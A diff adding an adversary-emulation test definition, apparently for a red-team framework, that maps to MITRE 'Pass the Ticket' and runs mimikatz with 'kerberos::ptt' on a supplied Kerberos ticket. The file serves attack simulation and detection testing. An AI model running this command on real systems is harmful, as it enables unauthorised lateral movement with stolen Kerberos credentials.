@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: Mimikatz Kerberos Ticket Attack
+description: |
+    Similar to PTH, but attacking Kerberos
+args:
+    - name: ticket
+      type: string
+      default: <nil>
+    - name: mimikatz_exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe
+uuid: dbf38128-7ba7-4776-bedf-cc2eed432098
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1550: Use Alternate Authentication Material'
+    subtechniques:
+        - 'T1550.003: Pass the Ticket'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: mimikatz-kerberos-ticket-attack
+      inline: |
+        "{{.Args.mimikatz_exe}}" "kerberos::ptt {{.Args.ticket}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
